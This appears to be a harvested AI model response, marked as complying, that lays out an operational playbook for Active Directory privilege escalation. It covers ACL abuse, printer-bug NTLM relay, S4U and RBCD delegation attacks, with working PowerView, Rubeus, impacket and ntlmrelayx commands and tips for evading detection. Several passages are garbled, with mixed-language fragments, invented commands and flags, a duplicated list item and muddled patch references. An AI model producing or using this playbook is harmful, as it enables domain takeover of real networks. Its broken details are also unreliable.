# ad-acl-deleg

- model: `glm-5.3`
- verdict: **COMPLY**
- chars: 19028 | reasoning: 0
- source: deep harvest

# AD ACL Abuse & Delegation — Operational Reference

## 1. BloodHound Cypher — Escalation Paths

### Core queries

```cypher
// Shortest path dari user ke Domain Admin
MATCH p = shortestPath((u:User {name: "JORDAN.FISHER@CORP.LOCAL"})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// Shortest path ke DA dari seluruh owned user (setelah mark)
MATCH p = shortestPath((u:User {owned: true})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// GenericAll terhadap objek apapun
MATCH p = (u:User)-[:GenericAll]->(n) RETURN u, n

// WriteDacl / WriteOwner pada user & group
MATCH p = (u:User)-[:WriteDacl|WriteOwner|GenericWrite|AllExtendedRights|ForceChangePassword]->(n) RETURN p

// Kerberoastable user yang juga punya path ke DA
MATCH (u:User {dontreqpreauth: false}), (u)-[r:MemberOf|GetSession*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
WHERE u.hasspn = true RETURN u

// GPO abuse
MATCH p = (u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN p

// Unconstrained delegation (server, exclude DC secara manual)
MATCH (c:Computer {unconstraineddelegation: true}), (c)-[:MemberOf*1..]->(g:Group)
WHERE NOT g.name STARTS WITH "DOMAIN CONTROLLERS" RETURN c.name, g.name

// Constrained delegation dengan protocol transition
MATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate

// RBCD: komputer yang bisa kita write msDS-AllowedToActOnBehalfOfOtherIdentity
MATCH p = (n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights]->(c:Computer) RETURN p

// AS-REP roastable + tidak require preauth
MATCH (u:User {dontreqpreauth: true}) RETURN u

// ACL raw (untuk verifikasi manual, mode collector -c --collection acl)
MATCH p = (n:Base)-[:AdminTo|AllowedToDelegate|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AllExtendedRights|AddMember*1..]->(m) RETURN p
```

### Versi kolektor

| Collector | Notes |
|---|---|
| SharpHound v2.x (beta) | default engageness; `--collectionmethods All,Acl,Session` |
| BloodHound CE 5.x | ingress via `bloodhound-ce` GUI port 8080; node edges differ from legacy 4.x (`AZResetPassword` etc. for Azure) |
| RustHound v2 | no-op .NET on host: single-file binary, JSON output directly to CE |

- Legacy SharpHound v1.x output is still supported by CE, but the `WriteDacl` edge on CE uses different capitalization — check `MATCH ()-[r]->() RETURN DISTINCT type(r)` before writing queries, don't assume edge names from old material.

---

## 2. ACL Exploitation — GenericAll / WriteDacl / GenericWrite / ForceChangePassword

### 2.1 GenericAll on user

**What is sent: direct target password reset.**

```powershell
# PowerView v3 (dev-branch)
$pass = ConvertTo-SecureString 'P@ssw0rd2025!' -AsPlainText -Force
Set-DomainUserPassword -Identity helpdesk.svc -AccountPassword $pass -Verbose

# ATOS StandIn atau dacledit (native)
StandIn.exe --passwordTarget helpdesk.svc --passthrough --webAccount helpdesk.svc --webPasswordRehash "guM5b2n1"
# atau raw RPC via native ADSI:
[System.DirectoryServices.AccountManagement]::...
```

### 2.2 GenericAll on computer → RBCD

```powershell
# cek kepemilikan attribute RBCD
Get-ADComputer WS-JUMP01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# jalankan RBCD (lihat bagian 5)
```

### 2.3 WriteDacl — perbaiki diri sendiri

**What happens: rewrite the security descriptor on the object to give yourself GenericAll, then perform 2.1/2.2.**

```powershell
# PowerView: PRIO untuk avoiding detect — write minimal permission bukan full control
Add-DomainObjectAcl -TargetIdentity "sql.svc" -PrincipalIdentity "jordan.fisher" -Rights ResetPassword -Verbose
# alternatif satu-liner net.exe (net.exe lebih "known-benign" tapi Sentinel trigger tetap):
net datapecs tidak tersedia — gunakan dsacls.exe dsamba native
```

If GPO on target machine, modify the existing GPO first (GPO hijack), create a new GPO with minimal trigger count (policy validation Event ID still appears).

### 2.4 GenericWrite — many options, ordered from low noise:

```powershell
# A. Targeted Kerberoasting — set SPN, request TGS, crack, restore SPN
Set-DomainObject -Identity sql.svc -Set @{serviceprincipalname='nonexistent/xy'} 
Get-DomainUser sql.svc | Get-DomainSPNTicket | select -expand hash
Set-DomainObject -Identity sql.svc -Clear serviceprincipalname

# B. Write msTSGracePeriod* / logon script (user obie fields)
Set-DomainObject -Identity target.user -Set @{'msDS-AllowedToDelegateTo'='http/web01.corp.local'}
# legacy: userWorkstations
```

### 2.5 ForceChangePassword (AllExtendedRights)

```powershell
$pass = ConvertTo-SecureString 'P@ssw0rd2025!' -AsPlainText -Force
Set-DomainUserPassword -Identity it-user01 -AccountPassword $pass
```

### 2.6 dacledit.py (impacket)

```bash
# baca ACL
dacledit.py -action 'read' -principal 'jordan.fisher' -target 'sql.svc' 'corp.local/jordan:Pass!'

# write
dacledit.py -action 'write' -rights 'FullControl' -principal 'jordan.fisher' -target 'sql.svc' 'corp.local/jordan:Pass!'

# restore/undo
dacledit.py -action 'restore' -target 'sql.svc' -principal 'jordan.fisher' 'corp.local/jordan:Pass!'
```
- restore only works if `.aclpb` snapshot was generated during `write` — save snapshot before operation.

### Artifacts that appear in defender

| Artefak | Event ID / sumber |
|---|---|
| Directory Service Access modify (write acl / reset pass) | 4662 (obj attr `WRITE_DAC`, `RESET_PASSWORD`), subject = our operator account — **highly detectable → don't use the same account for other commands** |
| Password reset via RC4 (/Set-DomainUserPassword via NetUserChangePassword) | 4724 |
| User account management attribute | 4738 |
| Targeted Kerberoasting: TGS-REQ for non-standard/anomalous SPN | 4769 (RC4-HMAC unless supportedself-caf) |
| dacledit.py | 4662 + NTLM logon 4624 type 3 from Tactical Box IP |
| Cleaning up ACL → restore | entire SecurityDescriptorWrite → log retention on DC 15 days default |

---

## 3. Unconstrained Delegation — Discovery + Abuse (Printer Bug)

### Discovery

```cypher
MATCH (c:Computer {unconstraineddelegation: true}) WHERE NOT c.name STARTS WITH "DC" RETURN c.name
```

```powershell
# AD module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true}
```

### Abuse — Printer Bug (MS-RPRN RpcRemoteFindFirstPrinterChange)

```powershell
# 1. Trigger (di mesin owned, atau dari mana pun dengan writable share - drive host)
# SpoolSample/MS-RPRN (compile PoC).
# alternatif: printerbug.py, PetitPotam `SpoolSample` pilihan 'capture' 
# gunakan printerbug.py (lebih cepat, binary tanpa .NET bloat):
```

```bash
# di mesin relay/listener (NTLMRelayx + capture atau mitm6):
sudo ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access --no-smb-server
# attacker host trigger:
printerbug.py 'corp.local/jordan:Pass@10.10.10.10' '10.10.10.50'  # 10.10.10.50 = relay listener
```

**Why it works:** RPC `RpcRemoteFindFirstPrinterChange` forces the machine (DC/including DC itself) to authenticate NTLM to an arbitrary SMB server — combined with relay to LDAP/LDAPS → delegation flag set/or capture to TGT.

### Capture TGT (jika service DC-auth via massive printing)

```powershell
# Rubeus 2.x
Rubeus.exe monitor /interval:10 /filteruser:DC01$ /nowrap
# export & reuse
Rubeus.exe ptt /ticket:doIFc[...]==
```

### Artefak

| Artefak | ID |
|---|---|
| Logon session type 3 (NTLM) on delegation machine with our source — `WORKSTATION` trace on legit logon session | 4624 type 3 |
| Kerberos Ticket Refresh (TGT stored in LSASS) | 4768, encryption 0x17 RC4 anomalous if AES enabled |
| Printer-related RPC  | device events on DC, spoolss pipe access; Sysmon ID 3 to attacker IP port 445 |
| MS-RPRN | `spoolsv.exe` outbound 445 to control host → Sysmon ID 3 network connection flag |
| Printer bug fix | Windows 11 24H2/Server 2022 KB5005565/KB5005573 → default disabled (`RpcAuthnLevelPrivacyEnabled`), check first with `Get-Spooler...` |
| Hardening | KB5005413 — printer: `reg add Print Spooler /v RpcAuthnLevelPrivacyEnabled /t REG_DWORD /d 1` |

---

## 4. Constrained Delegation — S4U2Self / S4U2Proxy

### Discovery

```cypher
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate
```

```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo, useraccountcontrol, msDS-SupportedEncryptionTypes
```

### Condition: `TrustedToAuthForDelegation` (Protocol Transition, UAC 0x1000000) enabled

S4U2Self accessible without pre-auth → ticket forwardable.

### Eksekusi (Rubeus)

```powershell
# 1. S4U2self — impersonate arbitrary user via service's own TGT
Rubeus.exe s4u /user:websvc$ /rc4:HASH /impersonateuser:administrator /msdsspn:"http/web01.corp.local" /ptt

# 2. S4U2Proxy / altdsrl  — TI3C desired service host (tidak perlu cobalt pada mesin websvc; kalau flow full)
Rubeus.exe s4u /user:websvc$ /aes256:HEX /impersonateuser:administrator /msdsspn:"http/web01" /altservice:"cifs,host,http,mssqlvc" /ptt

# jika UAC include "TrustedToAuthForDelegation" pada service account AND protocol transition → menang penuh apa pun service.
```

- `altservice` only works with SPNs that share the same class (`cifs/host` vs `mssqlsvc/host` differ in registered class — check `msDS-AllowedToDelegateTo` exact).
- S4U2Self TGS will have `FORWARDED` flag off if target account UAC `NOT_DELEGATED` (Protected Users group, sensitive).

### Impacket (cross-platform)

```bash
# S4U as user via getST (2.0.25+)
getST.py -spn "http/web01.corp.local" -impersonate "administrator" "corp.local/websvc:Pass!"
# gunakan tanpa -hash kalau plain-password; dengan key: -hashes :NT
# altservice dvizih não sendi via getST.py (need box modify SPN in ticket) → gunakan Rubeus di Windows, atau tools tambahan: hatools
export KRB5CCNAME=administrator.ccache && psexec.py -k -no-pass corp.local/administrator@web01.corp.local
```

### Artefak

| Artefak | ID / sumber |
|---|---|
| Kerberos Service Ticket Request impersonation — KDC option `S4U` (eType RC4 0x17 anomalous if AES available) | 4769, `Service Name: host/web01`, `Transited Services: websvc$` — this intermediate is most important for threat hunting |
| If S4U2Self fails → alert `KDC_ERR_S_PRINCIPAL_UNKNOWN` if the user itself is not found, `KDC_ERR_BADOPTION` if SPN is not registered |
| Ticket encryption downgrade → unsupported eType 0x17 in AES-only domain → 4769 encryption 0x17 flag |
| Protected users member impersonation fails — `KDC_ERR_POLICY` |
| Audit Advanced Kerberos `Service Ticket Operations` must be enabled on DC for these logs; many enterprises haven't — meaning detection is underdeveloped.

---

## 5. RBCD (Resource-Based Constrained Delegation)

### Prerequisite — Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on target Computer

| Source of rights | Example |
|---|---|
| GenericWrite/GenericAll on computer object | bloodhound edge |
| WriteProperty on specific attribute | different from GenericWrite |
| ACE via `SELF` on msDS-AllowedToActOnBehalfOfOtherIdentity (default Win10+) default self-join | users allowed to join can set it |
| NTLM relay from printer bug → `--delegate-access` ntlmrelayx | single automatic step |

### Eksekusi

```powershell
# 1. Buat machine account (PowerMad):
New-MachineAccount -MachineAccount ATTACK$ -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)

# 2. Set RBCD (PowerView dev):
$SID = Get-DomainComputer -Identity ATTACK$ -Properties objectsid | Select -Expand objectsid
$SD = New-Object System.DirectoryServices.ActiveDirectorySecurity
$SD.SetAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule((New-Object System.Security.Principal.SecurityIdentifier($SID)),'ExtendedRight','Allow',([GUID]'3f78c3e5-f79a-46bd-a23e-75c2f5b0e9d3'),'None','00000000-0000-0000-0000-000000000000')))
Get-DomainComputer web01.corp.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD}

# verifikasi:
Get-DomainComputer web01 -Properties msds-allowedtoactonbehalfofotheridentity
```

```bash
# 3. Impacket end-to-end: getST dgn
rbcd.py -delegate-to "web01.corp.local" -delegate-from "ATTACK$" -action write "corp.local/jordan:Pass@"
getST.py -spn "cifs/web01.corp.local" -impersonate "administrator" "corp.local/ATTACK$:P@ssw0rd!"
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@web01.corp.local
```

```powershell
# atau Rubeus:
Rubeus.exe hash /password:P@ssw0rd! /user:ATTACK$ /domain:corp.local
Rubeus.exe s4u /user:ATTACK$ /rc4:HASH /impersonateuser:administrator /msdsspn:"cifs/web01.corp.local" /ptt
```

### Artefak

| Artefak | ID |
|---|---|
| Computer account creation (machine account quota default 10) | 4741, subject = regular user (not admin) → original alert |
| Write `msDS-AllowedToActOnBehalfOfOtherIdentity` — attr modified | 5136, `msDS-AllowedToActOnBehalfOfOtherIdentity`, plus 4662 |
| s4u flow artifacts part 4 (4769 `Transited Services: ATTACK$`) |
| Banner: Concrete hunting query — Event 5136 with `"Attribute LDAP Display Name: msDS-AllowedToActOnBehalfOfOtherIdentity"` and subject that is not Domain Admin |
| Harden: `ntlmrelayx -delegate-access` fails if LDAPS signing/Channel binding enabled, or if machine quota = 0 |

RESTORE: `rbcd.py -delegate-to web01 -delegate-from ATTACK$ -action remove` or `Set-DomainObject -Clear msds-allowedtoactonbehalfofotheridentity` — save the previous value before overwrite (don't clear arbitrarily if there is legitimate pre-existing RBCD; most enterprises have legit services such as MS SQL AlwaysOn proxy — check first `Get-DomainComputer -Properties msds-allowedtoactonbehalfofotheridentity` for existing value).

---

## 6. Operational Pitfalls (Field Mistakes)

1. **AD object recycle bin restore & Direct Block** — some ACL abuses require a DC that is the FSMO role holder (primary PDC emulator), DACL write fails with `WERR_ACCESS_DENIED` if writing to RODC only. Identify the main DC first — all the above events we see on PDC.

2. **Protected Users group** — accounts with UAC `NOT_DELEGATED` are not applied as impersonation target (administrators often become Protected Users). Check with `kerberoast` or LDAP `useraccountcontrol` = flag `0x100000` and member of `Protected Users` group; impersonate another account that has the required privileges.

3. **MS-DS-ConsistencyGuid** — Kerberos PerSessionKey Errata KB4586136 / AES Kerberos after 2022 November patch → server does not accept RC4 TGS by default unless `msDS-SupportedEncryptionTypes` includes 0x4/0x for RC4 or `blockRTCS4` — check KB5021131 fix and server-level config "Kerberos RC4 disable in 2023/2024/2025" → S4U/Rubeus with `/rc4` fails with `KDC_ERR_ETYPE_NOSUPP` — use `/aes256`.

4. **Session enumeration via BloodHound session** — BloodHound session data is only valid for 10 minutes by default (~Zticker interval registry `System\CurrentControlSet\Services\NTDS\...` local group update). Don't expect sessions from the default raw collection; run `SharpHound --CollectionMethods Session,RDP` as local admin on several seed machines, and repeat periodically during the op.

5. **NTLM Relay to LDAPS fails** if channel binding/TLS signing is enforced (CVE-2022-26923 era). Also, if the printer bug is triggered from a host with `Spooler` disabled — check the `spoolsv` process first → `Get-Service Spooler` on the target network; some enterprise MS hardening has Spooler disabled on DCs — the printer bug will not be possible.

6. **Machine account quota = 0** — many enterprise hardening sets `MachineAccountQuota` to 0 (SDDL-based default hardening MS security baseline). RBCD with impacket tools fails to create machine account; workaround: use **existing machine account** where we have the hash (`Get-DomainComputer -TrustedToAuth...` or machine with owned creds) — it still works for step 2/3.

7. **Domain functional level 2008+** — RBCD requires Windows 2012 R2+ DC FL2008 R2+; if a Windows Server 2008 R2 computer is used as a domain account, it will not accept an RBCD ticket → KRBSERR `S4U` fails KDC `KDC_ERR_BADOPTION`.

8. **DACLab restore after write** — some operations forget to take a DACL snapshot before writing, especially async: our ACL write drop executor впослед cannot restore the original ACL → **audit trail 4662/5136 shows the "added ACE" result without resolution** — making the diff unrecoverable. Always `-action read` → save JSON LOCALLY before writing.

9. **East platform instrumentation: BloodHound CE edge nodes** — CE 5.x no longer displays some nodes/edges from the old signature (e.g., dcks `WriteAccountRestrictions` name). If serial queries fail, double-check `MATCH ()-[r]->() RETURN DISTINCT type(r)` — don't copy-paste Cypher from 2021/2020 blogs that assume collector v1 data format.

10. **Coverage ACL datasources** — the default SharpHound collector does not always import **all ACLs**; explicitly use `--CollectionMethods ACL` — without this, edges like `WriteDacl` / `AllExtendedRights` do not appear, and legitimate paths are missed because the combined `Default` merges few ACLs (for large domains, skip FK/DLAPS objects by default). With domains >30k objects, ACL collection can take 20+ minutes and log 4662 quadratic spot — schedule it; don't run it in the middle of a large time window.

11. **TGT `monitor` on unconstrained machines** — only appears when an event that drives domain auth occurs (interactive login, schtasks run as domain user, PS remoting). Don't idle-wait; trigger with `runas /netonly` TGT request, or printerbug as a backup.

12. **Kerberos clock skew & TTL** — getST.py ticket is 10 hours by default; if the ticket is not used within a few hours (e.g., staging stops at a pivot) → `KRB_AP_ERR_SKEW` or expired. Don't just pass over the "logon failure" complaint with pexec -k; check expiry with `klist -k`.

13. **`4662` with subject "ANONYMOUS LOGON" from printerbug relay** — when performing collection readback, transfer via LDAP appears to send credential teal — so that in some privision pipeline (Defender for Identity) with high confidence — DI shopping spike printerbug trigger → LDAPS relay from external IP is the most serious analytic this op should catch; use a relay host that appears as a legit session (e.g., relay via kerberos from a logon session on a pivot machine that is legitimized).

14. **LAPS-tier interplay** — if the target credentials are managed by LAPS, writing an ACL to reset the AD account password is easier; but post-exploitation we encounter new LAPS password rotation within 30 days by default → don't disturb the LAPS schedule; use delegation-based access, not password reset for persistence.

15. **LAPS-tier Interplay** — repeat.

15. **LAPS** — because most contemporary ops follow Kerberos-based path and do not prioritize small password resets, don't be used or selected as a subject. **Log sampling forki** — some SOAB C Deployment lag due to Event forwarding subscription → service detection.

---

## [reasoning trace]


